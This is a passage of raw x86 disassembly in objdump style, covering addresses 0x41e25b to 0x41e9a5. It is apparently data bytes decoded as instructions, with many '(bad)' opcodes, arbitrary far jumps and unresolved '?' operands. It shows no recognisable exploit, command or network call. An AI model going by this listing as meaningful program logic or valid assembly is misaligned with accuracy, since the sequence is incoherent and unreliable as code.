  41e25b:	out    dx,eax
  41e25c:	lods   ax,WORD PTR es:[esi]
  41e25f:	add    ah,bh
  41e261:	jns    0x41e1ee
  41e263:	shr    BYTE PTR [ebx+0x1d],cl
  41e266:	in     eax,0xc7
  41e268:	dec    ebx
  41e269:	(bad)  [edx]
  41e26b:	mov    edi,0xe4d00e4f
  41e270:	push   0xc7ae7034
  41e275:	mov    al,ds:0xb0a555bf
  41e27a:	and    esi,0x3200bd6c
  41e280:	add    eax,0xe9fde66f
  41e285:	inc    eax
  41e286:	addr16 jbe 0x41e286
  41e289:	push   ebp
  41e28a:	mov    fs,eax
  41e28c:	add    ecx,ebp
  41e28e:	std    
  41e28f:	daa    
  41e290:	pop    ebp
  41e291:	int3   
  41e292:	and    ah,bh
  41e294:	dec    esp
  41e295:	aaa    
  41e296:	shl    BYTE PTR [ebx-0x6f],cl
  41e299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e29a:	cmp    ebx,ebx
  41e29c:	lds    esp,FWORD PTR [ecx+0x1e0bfcd3]
  41e2a2:	(bad)  
  41e2a3:	pop    ecx
  41e2a4:	out    0x4c,al
  41e2a6:	inc    edx
  41e2a7:	xchg   ebx,eax
  41e2a8:	sbb    BYTE PTR [ebx],dh
  41e2aa:	shl    BYTE PTR [edx],cl
  41e2ac:	inc    eax
  41e2ad:	fistp  QWORD PTR [ebx]
  41e2af:	enter  0x313,0x63
  41e2b3:	fisub  WORD PTR [ebx-0x7a0a327f]
  41e2b9:	test   eax,esi
  41e2bb:	cmp    esi,DWORD PTR [eax-0x41]
  41e2be:	xchg   edi,eax
  41e2bf:	lods   al,BYTE PTR ds:[esi]
  41e2c0:	call   0x9d4a2e62
  41e2c5:	into   
  41e2c6:	mov    ebp,0xb9b0b0a8
  41e2cb:	sbb    al,0xa2
  41e2cd:	call   0xbc37:0x36f4201
  41e2d4:	loope  0x41e341
  41e2d6:	jmp    0xfb14:0x8ab568ad
  41e2dd:	adc    dh,cl
  41e2df:	mov    ah,0x8e
  41e2e1:	iret   
  41e2e2:	sar    BYTE PTR [edi-0x37],0xa7
  41e2e6:	cmc    
  41e2e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2e8:	in     al,dx
  41e2e9:	sbb    esi,esi
  41e2eb:	fwait
  41e2ec:	in     al,0x2b
  41e2ee:	int3   
  41e2ef:	outs   dx,DWORD PTR ds:[esi]
  41e2f0:	pop    esi
  41e2f1:	pop    esi
  41e2f2:	loop   0x41e2b4
  41e2f4:	lahf   
  41e2f5:	xchg   DWORD PTR [ecx-0x4f1179ce],edi
  41e2fb:	or     DWORD PTR [ebx-0x398ef1e],0xc62252b1
  41e305:	pop    es
  41e306:	test   ecx,ebx
  41e308:	xchg   ebp,eax
  41e309:	ror    BYTE PTR [ebp+0x1d],1
  41e30c:	push   esp
  41e30d:	daa    
  41e30e:	ficom  DWORD PTR [edi+0x14]
  41e311:	push   eax
  41e312:	out    dx,eax
  41e313:	dec    edx
  41e314:	mov    dh,0x86
  41e316:	loopne 0x41e2d4
  41e318:	adc    DWORD PTR [ebx],esi
  41e31a:	loopne 0x41e29e
  41e31c:	(bad)  
  41e31d:	out    0xa2,eax
  41e31f:	push   0xffffff9e
  41e321:	cmp    eax,0x6b2f5cae
  41e326:	into   
  41e327:	sub    dl,BYTE PTR [esi+edx*8]
  41e32a:	or     eax,0x1dfec4fa
  41e32f:	push   es
  41e330:	dec    ebx
  41e331:	repz cdq 
  41e333:	mov    eax,0x4f6abb9
  41e338:	clc    
  41e339:	xchg   ebp,eax
  41e33a:	into   
  41e33b:	dec    ebp
  41e33c:	(bad)  
  41e33e:	mov    edi,0xb49ce64d
  41e343:	es xor eax,0xb5bc6b6b
  41e349:	(bad)  
  41e34a:	daa    
  41e34b:	mov    ah,0x8d
  41e34d:	jg     0x41e3ad
  41e34f:	fsubr  st,st(1)
  41e351:	push   0xbf7617fc
  41e356:	das    
  41e357:	or     DWORD PTR [ecx+0x36424f6],ebp
  41e35d:	sar    DWORD PTR [edx-0x48],1
  41e360:	adc    DWORD PTR [esi],ebp
  41e362:	(bad)  
  41e363:	ficom  DWORD PTR [edx]
  41e365:	pop    esp
  41e366:	sub    cl,BYTE PTR [eax]
  41e368:	fstp   QWORD PTR [eax-0x2e]
  41e36b:	clc    
  41e36c:	sahf   
  41e36d:	xchg   BYTE PTR ds:0x1aa866dd,dh
  41e373:	stc    
  41e374:	call   0x493fae98
  41e379:	pop    esp
  41e37a:	add    BYTE PTR [esi-0x4d7691b1],ah
  41e380:	push   0xf885dac1
  41e385:	mov    bl,0xa
  41e387:	retf   0xe994
  41e38a:	sti    
  41e38b:	daa    
  41e38c:	cwde   
  41e38d:	or     DWORD PTR [edx-0x46a5eca],ecx
  41e393:	pop    ebp
  41e394:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41e396:	xchg   esp,eax
  41e397:	pop    edx
  41e398:	stos   BYTE PTR es:[edi],al
  41e399:	pop    edi
  41e39a:	mov    dl,0x9b
  41e39c:	fwait
  41e39d:	dec    esp
  41e39e:	sbb    eax,0x3b60c72a
  41e3a3:	ds and dh,bl
  41e3a6:	idiv   BYTE PTR [edi-0x2f]
  41e3a9:	lods   eax,DWORD PTR ds:[esi]
  41e3aa:	xor    BYTE PTR [ebp-0x75],cl
  41e3ad:	outs   dx,DWORD PTR ds:[esi]
  41e3ae:	adc    esi,eax
  41e3b0:	or     edi,DWORD PTR [eax+0x32]
  41e3b3:	sbb    ebp,DWORD PTR [edx-0x4d74787c]
  41e3b9:	jmp    0x5f23dc4f
  41e3be:	xor    al,0x24
  41e3c0:	stos   BYTE PTR es:[edi],al
  41e3c1:	sbb    ebp,DWORD PTR [ebp+0x65a0904c]
  41e3c7:	pop    edi
  41e3c8:	loopne 0x41e357
  41e3ca:	sub    dl,BYTE PTR [edx]
  41e3cc:	mov    ebp,0x6fc1b68d
  41e3d1:	add    al,0x5f
  41e3d3:	(bad)
  41e3d8:	lahf   
  41e3d9:	or     eax,0xf7dc29da
  41e3de:	fild   WORD PTR [ebx+0x694e0c33]
  41e3e4:	into   
  41e3e5:	ret    0xfdf6
  41e3e8:	sbb    ebp,DWORD PTR [eax+0xf78be43]
  41e3ee:	cli    
  41e3ef:	popa   
  41e3f0:	popa   
  41e3f1:	mov    ebp,0xa8b13c85
  41e3f6:	sar    BYTE PTR [ecx+0x12],cl
  41e3f9:	jg     0x41e414
  41e3fb:	pusha  
  41e3fc:	dec    eax
  41e3fd:	push   eax
  41e3fe:	xchg   BYTE PTR [eax+0x3d],cl
  41e401:	mov    edi,0x3427c7e7
  41e406:	push   cs
  41e407:	mov    ds:0x8bfcca2,eax
  41e40c:	int3   
  41e40d:	ja     0x41e42e
  41e40f:	ret    0x627e
  41e412:	push   eax
  41e413:	pop    eax
  41e414:	stc    
  41e415:	repz add ebp,DWORD PTR [edi]
  41e418:	mov    al,ds:0x880f3bcd
  41e41d:	in     eax,dx
  41e41e:	retf   
  41e41f:	mov    edi,0x76236464
  41e424:	adc    DWORD PTR [eax-0x78cf4fee],esp
  41e42a:	xor    al,0x9
  41e42c:	sbb    BYTE PTR [eax],ch
  41e42e:	push   DWORD PTR [ebx]
  41e430:	pop    esp
  41e431:	fdivr  DWORD PTR [edi]
  41e433:	addr16 push es
  41e435:	sbb    bh,BYTE PTR [ecx+0x22]
  41e438:	sbb    al,ah
  41e43a:	or     al,0xda
  41e43c:	into   
  41e43d:	fwait
  41e43e:	rol    BYTE PTR [ecx],cl
  41e440:	jae    0x41e42f
  41e442:	loope  0x41e4c2
  41e444:	fild   WORD PTR [edx]
  41e446:	inc    ecx
  41e447:	fwait
  41e448:	(bad)  
  41e449:	out    dx,al
  41e44a:	pop    edi
  41e44b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e44c:	call   0x3d9456dc
  41e451:	pop    edx
  41e452:	mul    BYTE PTR [esi]
  41e454:	int    0x20
  41e456:	data16 repz add BYTE PTR [esp+ebx*4+0x17a4125e],al
  41e45f:	ret    0x6bc1
  41e462:	pop    ds
  41e463:	scas   eax,DWORD PTR es:[edi]
  41e464:	pop    esp
  41e465:	(bad)  
  41e466:	push   0xa5da0a17
  41e46b:	sbb    ebx,DWORD PTR [eax+eax*1+0x43b0c103]
  41e472:	scas   eax,DWORD PTR es:[edi]
  41e473:	int    0x2d
  41e475:	push   esi
  41e476:	sbb    al,0x12
  41e478:	fcmovu st,st(3)
  41e47a:	inc    edx
  41e47b:	push   0x76d2f789
  41e480:	mov    ds:0xb5bb931e,eax
  41e485:	pop    ss
  41e486:	sub    DWORD PTR [ecx-0x1b],0x10242d7b
  41e48d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e48e:	(bad)  
  41e48f:	in     eax,dx
  41e490:	stos   BYTE PTR es:[edi],al
  41e491:	mov    eax,?
  41e493:	sahf   
  41e494:	dec    ebx
  41e495:	(bad)  
  41e496:	xor    dl,BYTE PTR [ebx]
  41e498:	mov    edi,0xac78a808
  41e49d:	(bad)  [eax+0x1a]
  41e4a0:	pop    es
  41e4a1:	and    eax,0x6b94b676
  41e4a6:	lods   al,BYTE PTR ds:[esi]
  41e4a7:	inc    BYTE PTR [esi+edx*1-0x1b7b8bc9]
  41e4ae:	fldenv [ebp+0x17]
  41e4b1:	and    eax,0x1831d593
  41e4b6:	or     eax,0x5b28a74f
  41e4bb:	icebp  
  41e4bc:	scas   eax,DWORD PTR es:[edi]
  41e4bd:	dec    esi
  41e4be:	(bad)  
  41e4bf:	xlat   BYTE PTR ds:[ebx]
  41e4c0:	into   
  41e4c1:	clc    
  41e4c2:	xor    bl,BYTE PTR [esi+0x67]
  41e4c5:	mov    fs,WORD PTR [ebp+0x1f]
  41e4c8:	out    dx,eax
  41e4c9:	push   0x59306dc7
  41e4ce:	ja     0x41e48a
  41e4d0:	mov    ds:0x33239dea,eax
  41e4d6:	leave  
  41e4d7:	xlat   BYTE PTR ds:[ebx]
  41e4d8:	into   
  41e4d9:	jne    0x41e4c2
  41e4db:	cdq    
  41e4dc:	addr16 popa 
  41e4de:	pop    esp
  41e4df:	mov    ebx,0x76a41936
  41e4e4:	xor    ebp,DWORD PTR [ebp+0x18]
  41e4e7:	pop    esp
  41e4e8:	fldenv ds:0xb3f6eaff
  41e4ee:	rcl    esp,cl
  41e4f0:	adc    ch,BYTE PTR [esi-0x5814757e]
  41e4f6:	pop    esi
  41e4f7:	or     cl,BYTE PTR [edx]
  41e4f9:	and    dl,BYTE PTR [ebp+0x54]
  41e4fc:	pop    es
  41e4fd:	sbb    eax,0x9304a126
  41e502:	add    bh,bl
  41e504:	test   BYTE PTR [ebx],bh
  41e506:	push   ebp
  41e507:	js     0x41e585
  41e509:	dec    ebp
  41e50a:	fsub   st,st(1)
  41e50c:	inc    esp
  41e50d:	out    0x17,al
  41e50f:	repnz xor edx,edx
  41e512:	dec    esp
  41e513:	in     eax,0x3b
  41e515:	xor    BYTE PTR [edx+0x675a306e],dh
  41e51b:	sub    DWORD PTR [ecx+0x6afaed4],0x76
  41e522:	cs loop 0x41e4a9
  41e525:	imul   esp,DWORD PTR [ecx+ebp*1],0x56
  41e529:	fs mov al,0xf7
  41e52c:	ins    DWORD PTR es:[edi],dx
  41e52d:	jge    0x41e4f9
  41e52f:	mov    ds:0x7bc2a1c4,al
  41e534:	pop    edx
  41e535:	int3   
  41e536:	scas   eax,DWORD PTR es:[edi]
  41e537:	fwait
  41e538:	jne    0x8a154001
  41e53e:	add    DWORD PTR [ebx-0x15],edx
  41e541:	aaa    
  41e542:	cmp    DWORD PTR [eax],ecx
  41e544:	lods   eax,DWORD PTR ds:[esi]
  41e545:	sbb    dh,BYTE PTR [ebp-0x325c6044]
  41e54b:	jg     0x41e56c
  41e54d:	lods   al,BYTE PTR ds:[esi]
  41e54e:	retf   
  41e54f:	xchg   esi,eax
  41e550:	sub    BYTE PTR [edx-0x6c],bl
  41e553:	push   esi
  41e554:	fidivr DWORD PTR [ebp-0x20]
  41e557:	or     DWORD PTR ds:0x77ac1c02,edx
  41e55d:	dec    ecx
  41e55e:	fidivr DWORD PTR [esp+eax*2-0x70]
  41e562:	push   cs
  41e563:	and    dl,BYTE PTR [eax]
  41e565:	sbb    DWORD PTR [esi+0x46915605],ebp
  41e56b:	jo     0x41e4f3
  41e56d:	popa   
  41e56e:	int    0xd7
  41e570:	xchg   esi,eax
  41e571:	jno    0x41e5d6
  41e573:	adc    BYTE PTR [edi-0x4e],ch
  41e576:	adc    DWORD PTR cs:[edx],0x957414b2
  41e57d:	pop    edx
  41e57e:	cdq    
  41e57f:	mov    dh,0x26
  41e581:	jnp    0x41e551
  41e583:	xor    eax,0x78ee4bae
  41e588:	popf   
  41e589:	xchg   edi,eax
  41e58a:	mov    esi,cs
  41e58c:	mov    al,BYTE PTR [esi+0x0]
  41e58f:	mov    ecx,0x3d038299
  41e594:	xchg   edi,eax
  41e595:	test   al,0x74
  41e597:	scas   eax,DWORD PTR es:[edi]
  41e598:	xchg   esi,eax
  41e599:	aas    
  41e59a:	and    ecx,DWORD PTR [ebx]
  41e59c:	pop    ecx
  41e59d:	xchg   BYTE PTR [eax],bl
  41e59f:	pop    eax
  41e5a0:	add    BYTE PTR es:[esi+0x53],al
  41e5a4:	call   0xf2b24a6a
  41e5a9:	cmp    esi,DWORD PTR [eax+0x4fe0361c]
  41e5af:	aam    0xed
  41e5b1:	ret    0x13a
  41e5b4:	sbb    eax,DWORD PTR [esi]
  41e5b6:	(bad)  
  41e5b7:	lods   eax,DWORD PTR ds:[esi]
  41e5b8:	mov    ebx,?
  41e5ba:	in     al,dx
  41e5bb:	repz cmp ebp,edi
  41e5be:	or     DWORD PTR [ebx-0x1d64dfe8],0x52381ee8
  41e5c8:	ret    
  41e5c9:	xor    BYTE PTR [edi-0x3315b7dd],dh
  41e5cf:	pushf  
  41e5d0:	fsub   DWORD PTR [eax-0x626d4444]
  41e5d6:	push   ecx
  41e5d7:	jmp    0x1468:0x7d6182a4
  41e5de:	pop    es
  41e5df:	mov    esi,edi
  41e5e1:	cmp    esi,DWORD PTR [eax+0x11]
  41e5e4:	not    BYTE PTR [ebx-0x424e4c2c]
  41e5ea:	scas   al,BYTE PTR es:[edi]
  41e5eb:	cld    
  41e5ec:	sti    
  41e5ed:	outs   dx,BYTE PTR ds:[esi]
  41e5ee:	fst    DWORD PTR [ecx+0x72]
  41e5f1:	test   eax,0x80f3437e
  41e5f6:	xchg   edi,eax
  41e5f7:	cmc    
  41e5f8:	sub    al,0xb3
  41e5fa:	mov    cl,ah
  41e5fc:	push   ebp
  41e5fd:	fisttp WORD PTR [ebx-0x54]
  41e600:	aam    0x50
  41e602:	or     al,0xc4
  41e604:	jg     0x41e5c2
  41e606:	sbb    edx,DWORD PTR [ebp-0x113dd487]
  41e60c:	or     DWORD PTR ds:0x68a8a7ec,eax
  41e612:	or     al,0x3f
  41e614:	ret    0xb133
  41e617:	ret    0xd788
  41e61a:	cmc    
  41e61b:	aaa    
  41e61c:	sub    DWORD PTR [edx],0xa2a3e55c
  41e622:	fistp  DWORD PTR [edx+0x43488347]
  41e628:	dec    eax
  41e629:	out    0xa4,eax
  41e62b:	int3   
  41e62c:	shl    ebx,1
  41e62e:	dec    esi
  41e62f:	imul   ecx,DWORD PTR [ebp-0x72],0xffffff8a
  41e633:	fiadd  DWORD PTR fs:[edx-0x540aa01d]
  41e63a:	xor    BYTE PTR [eax-0xf],al
  41e63d:	cmp    DWORD PTR [edi],esp
  41e63f:	mov    ch,0xb3
  41e641:	(bad)  
  41e642:	mov    BYTE PTR [esi],bh
  41e644:	cmp    BYTE PTR [ebx+0x4d],ah
  41e647:	mov    esp,0x94832928
  41e64c:	icebp  
  41e64d:	push   edi
  41e64e:	and    DWORD PTR [edx-0x2d],eax
  41e651:	xchg   ebp,eax
  41e652:	sbb    al,0x46
  41e654:	pop    ds
  41e655:	je     0x41e61f
  41e657:	cmp    ebx,DWORD PTR [ebx+0xe]
  41e65a:	das    
  41e65b:	sbb    BYTE PTR [edi-0x71],bl
  41e65e:	les    esi,FWORD PTR [eax-0x78]
  41e661:	icebp  
  41e662:	clc    
  41e663:	push   esp
  41e664:	test   al,0x20
  41e666:	leave  
  41e667:	jle    0x41e636
  41e669:	das    
  41e66a:	sbb    eax,0x7caff863
  41e66f:	sahf   
  41e670:	push   edi
  41e671:	sar    DWORD PTR [esi],cl
  41e673:	stos   BYTE PTR es:[edi],al
  41e674:	inc    edx
  41e675:	sahf   
  41e676:	jge    0x41e62e
  41e678:	xor    DWORD PTR [ebx+0x6d8fd591],0x3
  41e67f:	rcl    DWORD PTR [ecx],1
  41e681:	dec    ebx
  41e682:	ror    DWORD PTR [edx+ebx*1],0xaf
  41e686:	cs xchg edi,eax
  41e688:	(bad)  
  41e689:	in     al,dx
  41e68a:	loop   0x41e616
  41e68c:	sar    BYTE PTR [eax+0x70],1
  41e68f:	jl     0x41e676
  41e691:	push   ebp
  41e692:	mov    dh,bh
  41e694:	adc    eax,0x6ba9bdd
  41e699:	icebp  
  41e69a:	jbe    0x41e6f2
  41e69c:	sub    esi,0xe90f85fe
  41e6a2:	mov    ebx,0x619dc5df
  41e6a7:	adc    al,0x10
  41e6a9:	bound  edx,QWORD PTR [edx-0x74ab86ef]
  41e6af:	cmp    bl,dl
  41e6b1:	or     esp,DWORD PTR [ebx+0x27]
  41e6b4:	in     eax,0xee
  41e6b6:	sbb    dl,dl
  41e6b8:	dec    eax
  41e6b9:	cwde   
  41e6ba:	call   0x510f:0xb197b4d
  41e6c1:	or     eax,0x829af94c
  41e6c6:	xchg   esp,eax
  41e6c7:	pop    ebx
  41e6c8:	mov    eax,0xfaba867d
  41e6cd:	cmp    edi,ebp
  41e6cf:	cli    
  41e6d0:	mov    edx,0xc7eec692
  41e6d5:	and    esp,DWORD PTR [ebx-0xfeb696d]
  41e6db:	push   edx
  41e6dc:	sahf   
  41e6dd:	push   0xff4bcbd5
  41e6e2:	xor    esi,0xffffffdd
  41e6e5:	loopne 0x41e728
  41e6e7:	add    edx,DWORD PTR [edi-0x5f85a197]
  41e6ed:	cld    
  41e6ee:	jecxz  0x41e67b
  41e6f0:	push   ds
  41e6f1:	sbb    BYTE PTR [esi],0x6b
  41e6f4:	dec    ebp
  41e6f5:	out    dx,al
  41e6f6:	pop    edi
  41e6f7:	xchg   ecx,esi
  41e6f9:	je     0x41e709
  41e6fb:	test   BYTE PTR [esi-0x6c],bh
  41e6fe:	stos   BYTE PTR es:[edi],al
  41e6ff:	xor    BYTE PTR [esi],cl
  41e701:	xlat   BYTE PTR ds:[ebx]
  41e702:	daa    
  41e703:	cmp    ebx,DWORD PTR [edi+0x48bdfa0d]
  41e709:	push   ebp
  41e70a:	in     eax,0x35
  41e70c:	fisttp WORD PTR [ecx]
  41e70e:	mov    al,0x5
  41e710:	adc    BYTE PTR [edi-0x7a],bh
  41e713:	dec    esi
  41e714:	push   es
  41e715:	ins    BYTE PTR es:[edi],dx
  41e716:	jae    0x41e6fb
  41e718:	and    eax,0x8b6248e0
  41e71d:	lea    edi,[ecx-0x24]
  41e720:	add    al,0x15
  41e722:	xor    al,0x49
  41e724:	jmp    0x41e7a5
  41e726:	push   eax
  41e727:	test   DWORD PTR [eax+0x18],edi
  41e72a:	dec    ebp
  41e72b:	mov    ?,edx
  41e72d:	jo     0x41e751
  41e72f:	add    eax,0x6f7f62c2
  41e734:	mov    ah,0xaf
  41e736:	sbb    esp,DWORD PTR [ebx]
  41e738:	push   es
  41e739:	aad    0x14
  41e73b:	push   ds
  41e73c:	js     0x41e77e
  41e73e:	dec    esi
  41e73f:	enter  0x284,0xd2
  41e743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e744:	stos   BYTE PTR es:[edi],al
  41e745:	jmp    0xa26:0x73ed6cbd
  41e74c:	xor    BYTE PTR [edi+0x19a607f3],ch
  41e752:	xor    DWORD PTR [ecx],ebp
  41e754:	fst    QWORD PTR [esi+ecx*2]
  41e757:	mov    al,BYTE PTR [edi-0x44]
  41e75a:	lods   eax,DWORD PTR ds:[esi]
  41e75b:	cmp    ebp,DWORD PTR [edx-0xef1ede8]
  41e761:	repz jg 0x41e7cc
  41e764:	(bad)  
  41e765:	mov    esi,0xdef5e440
  41e76a:	out    0xc7,eax
  41e76c:	out    0x4d,al
  41e76e:	jbe    0x41e798
  41e770:	or     al,0x5e
  41e772:	dec    ebx
  41e773:	or     al,0xa6
  41e775:	jno    0x41e799
  41e777:	mov    WORD PTR [ecx],?
  41e779:	mov    bl,0xf6
  41e77b:	popf   
  41e77c:	jb     0x41e774
  41e77e:	xchg   edi,eax
  41e77f:	lock or al,0x91
  41e782:	xor    BYTE PTR [ebx+0x75],bh
  41e785:	sub    DWORD PTR ds:0xfd903b6e,eax
  41e78b:	sub    al,0xee
  41e78d:	in     eax,0xbb
  41e78f:	mov    edx,eax
  41e791:	dec    ebx
  41e792:	push   0x61
  41e794:	cmp    esi,DWORD PTR [edx+0x6c7e5a50]
  41e79a:	and    ah,cl
  41e79c:	lods   eax,DWORD PTR ds:[esi]
  41e79d:	pop    ss
  41e79e:	ja     0x41e75b
  41e7a0:	xor    BYTE PTR [eax+0x25],dl
  41e7a3:	test   BYTE PTR [esi],dh
  41e7a5:	aas    
  41e7a6:	cmp    bh,BYTE PTR [esi-0x57]
  41e7a9:	imul   eax,edi,0xffffff85
  41e7ac:	push   ss
  41e7ad:	xchg   edi,eax
  41e7ae:	push   es
  41e7af:	repnz sub BYTE PTR [ecx],bl
  41e7b2:	cli    
  41e7b3:	inc    ebp
  41e7b4:	ss and ch,cl
  41e7b7:	xchg   BYTE PTR cs:[ebx+0x716a1beb],ah
  41e7be:	adc    eax,DWORD PTR [ecx+ebp*2]
  41e7c1:	mov    ds:0x277b6327,eax
  41e7c6:	stos   BYTE PTR es:[edi],al
  41e7c7:	aas    
  41e7c8:	jno    0x41e77f
  41e7ca:	and    dh,cl
  41e7cc:	dec    esi
  41e7cd:	mov    eax,ds:0xff0dbeee
  41e7d2:	adc    DWORD PTR [ebp-0x3a],esp
  41e7d5:	sbb    BYTE PTR [edi],0x4d
  41e7d8:	int    0x7c
  41e7da:	inc    eax
  41e7db:	sbb    eax,0xcfdd7489
  41e7e0:	fs in  al,dx
  41e7e2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41e7e4:	sbb    al,0xe2
  41e7e6:	mov    ebp,cs
  41e7e8:	pop    edi
  41e7e9:	maxps  xmm3,XMMWORD PTR [edx+0x54257ab6]
  41e7f0:	pop    ebp
  41e7f1:	xor    eax,ebx
  41e7f3:	pop    ss
  41e7f4:	xor    DWORD PTR es:[ebx],edi
  41e7f7:	jno    0x41e7c1
  41e7f9:	jno    0x41e83e
  41e7fb:	loope  0x41e7ae
  41e7fd:	xor    eax,0x17946aba
  41e802:	pop    ebx
  41e803:	mov    ch,0x60
  41e805:	push   edx
  41e806:	into   
  41e807:	jg     0x41e868
  41e809:	push   ebx
  41e80a:	test   BYTE PTR [eax+0x17],ch
  41e80d:	repz mov edi,edi
  41e810:	jae    0x41e83f
  41e812:	mov    ds:0x15b7f2b,al
  41e817:	sub    al,0x34
  41e819:	jg     0x41e81d
  41e81b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e81c:	imul   edi,DWORD PTR [eax],0x6d
  41e81f:	xlat   BYTE PTR ds:[ebx]
  41e820:	ret    0x9e75
  41e823:	jae    0x41e829
  41e825:	adc    eax,0x14d797d8
  41e82a:	push   esi
  41e82b:	inc    ebp
  41e82c:	retf   0x548e
  41e82f:	and    al,0xd9
  41e831:	jae    0x41e870
  41e833:	outs   dx,BYTE PTR ds:[esi]
  41e834:	retf   0x983d
  41e837:	fidivr WORD PTR [ebx+0x76]
  41e83a:	dec    DWORD PTR ss:[ebx-0xb]
  41e83e:	std    
  41e83f:	and    ch,cl
  41e841:	loop   0x41e827
  41e843:	fisub  DWORD PTR [ecx]
  41e845:	fidivr DWORD PTR [ebp-0x32]
  41e848:	fldcw  WORD PTR [eax-0x64]
  41e84b:	imul   ebx,DWORD PTR [ebx],0xffffff84
  41e84e:	push   edx
  41e84f:	or     DWORD PTR [edx+edi*2-0xf],ebp
  41e853:	iret   
  41e854:	xchg   ebp,eax
  41e855:	(bad)  
  41e856:	jb     0x41e83b
  41e858:	jae    0x41e89f
  41e85a:	stos   BYTE PTR es:[edi],al
  41e85b:	das    
  41e85c:	popf   
  41e85d:	cmp    BYTE PTR [edi],0x54
  41e860:	mov    al,0x88
  41e862:	xor    al,0xd2
  41e864:	or     cl,bl
  41e866:	and    ecx,DWORD PTR [ecx]
  41e868:	xchg   esi,eax
  41e869:	fwait
  41e86a:	sub    eax,0x61826309
  41e86f:	xor    esi,DWORD PTR [esi]
  41e871:	inc    esp
  41e872:	ins    BYTE PTR es:[edi],dx
  41e873:	pop    eax
  41e874:	xchg   ebx,eax
  41e875:	enter  0xe17d,0x13
  41e879:	push   ss
  41e87a:	out    dx,al
  41e87b:	add    DWORD PTR [ecx+0x66],esp
  41e87e:	jb     0x41e850
  41e880:	aam    0x1f
  41e882:	(bad)  
  41e883:	jle    0x41e80d
  41e885:	ins    DWORD PTR es:[edi],dx
  41e886:	mov    cl,0x98
  41e888:	int3   
  41e889:	mov    bl,0x84
  41e88b:	mov    dh,bh
  41e88d:	in     al,dx
  41e88e:	lahf   
  41e88f:	je     0x41e893
  41e891:	sbb    al,0xf3
  41e893:	push   ebx
  41e894:	mov    ch,0x92
  41e896:	push   ebp
  41e897:	les    ecx,FWORD PTR [ecx+0x5b02c06c]
  41e89d:	mov    edi,0x7b5fc946
  41e8a2:	pushf  
  41e8a3:	adc    DWORD PTR [ecx-0x3f],eax
  41e8a6:	enter  0xa782,0xac
  41e8aa:	gs sub eax,0x734f40cc
  41e8b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8b1:	adc    eax,0xff4ee4fd
  41e8b6:	jne    0x41e87f
  41e8b8:	xchg   edi,eax
  41e8b9:	inc    eax
  41e8ba:	dec    esp
  41e8bb:	mov    al,0xfb
  41e8bd:	push   esi
  41e8be:	or     edx,ebx
  41e8c0:	test   esi,edi
  41e8c2:	in     al,0x80
  41e8c4:	retf   0x5df
  41e8c7:	and    BYTE PTR [edx-0x4f],bl
  41e8ca:	dec    esp
  41e8cb:	nop
  41e8cc:	test   al,0xbd
  41e8ce:	fiadd  WORD PTR [ecx-0x330d8073]
  41e8d4:	mov    al,0x7f
  41e8d6:	and    DWORD PTR [esi-0x549bc4a5],ecx
  41e8dc:	repnz ror dh,cl
  41e8df:	mov    dl,0xad
  41e8e1:	test   BYTE PTR [eax-0x796b7300],cl
  41e8e7:	dec    ebp
  41e8e8:	mov    ch,0x77
  41e8ea:	push   ecx
  41e8eb:	xor    eax,0xd3575c45
  41e8f0:	xchg   ebx,eax
  41e8f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8f2:	jae    0x41e959
  41e8f4:	add    DWORD PTR [esp+ebp*2+0x54],ebp
  41e8f8:	adc    DWORD PTR [eax],esp
  41e8fa:	and    al,0xb3
  41e8fc:	ins    BYTE PTR es:[edi],dx
  41e8fd:	loope  0x41e932
  41e8ff:	add    bh,bh
  41e901:	popa   
  41e902:	call   0x9c988875
  41e907:	fst    DWORD PTR [edx+edi*4+0x1ac4d74b]
  41e90e:	push   cs
  41e90f:	cmp    ah,BYTE PTR [ecx+0x336c48b5]
  41e915:	push   esi
  41e916:	ret    
  41e917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e918:	es push ds
  41e91a:	pusha  
  41e91b:	add    dh,BYTE PTR [esi]
  41e91d:	not    BYTE PTR [edi]
  41e91f:	retf   0xb883
  41e922:	jb     0x41e939
  41e924:	cmp    dl,dh
  41e926:	pusha  
  41e927:	add    edi,edx
  41e929:	jp     0x41e937
  41e92b:	stc    
  41e92c:	sub    eax,ebx
  41e92e:	fcomp  QWORD PTR [ebx]
  41e930:	cmp    esi,ebp
  41e932:	enter  0xdc25,0xab
  41e936:	into   
  41e937:	mov    al,ds:0x4e79ace2
  41e93c:	jle    0x41e8d4
  41e93e:	push   eax
  41e93f:	(bad)  
  41e941:	outs   dx,DWORD PTR ds:[esi]
  41e942:	out    dx,al
  41e943:	fs stos BYTE PTR es:[edi],al
  41e945:	jno    0x41e98c
  41e947:	dec    edi
  41e948:	imul   ecx,DWORD PTR [edi],0x66
  41e94b:	dec    eax
  41e94c:	stos   DWORD PTR es:[edi],eax
  41e94d:	clc    
  41e94e:	call   0xe38:0xd1f24ad
  41e955:	addr16 mov bh,0x60
  41e958:	mov    eax,ds:0xecd8449e
  41e95d:	retf   0x9dfa
  41e960:	jnp    0x41e944
  41e962:	and    eax,0x5573e8bb
  41e967:	adc    BYTE PTR [ebp-0x210dc271],dh
  41e96d:	js     0x41e92a
  41e96f:	add    BYTE PTR [eax+0x292e9c20],al
  41e975:	xor    dh,BYTE PTR [esi+0x72]
  41e978:	adc    BYTE PTR [edi],dl
  41e97a:	add    eax,0x55d9bcc5
  41e97f:	xchg   edi,eax
  41e980:	pop    edx
  41e981:	ss jp  0x42bc82a2
  41e988:	dec    esi
  41e989:	add    eax,0x811601fb
  41e98e:	mov    al,0xe6
  41e990:	outs   dx,DWORD PTR ds:[esi]
  41e991:	leave  
  41e992:	inc    edi
  41e993:	inc    eax
  41e994:	and    BYTE PTR [edi+0x6d7b5fb7],al
  41e99a:	xor    ch,cl
  41e99c:	dec    ebp
  41e99d:	jmp    0x41e993
  41e99f:	mov    ch,BYTE PTR [eax-0x1d]
  41e9a2:	mov    dl,0xfa
  41e9a4:	popa   
  41e9a5:	push   ebp
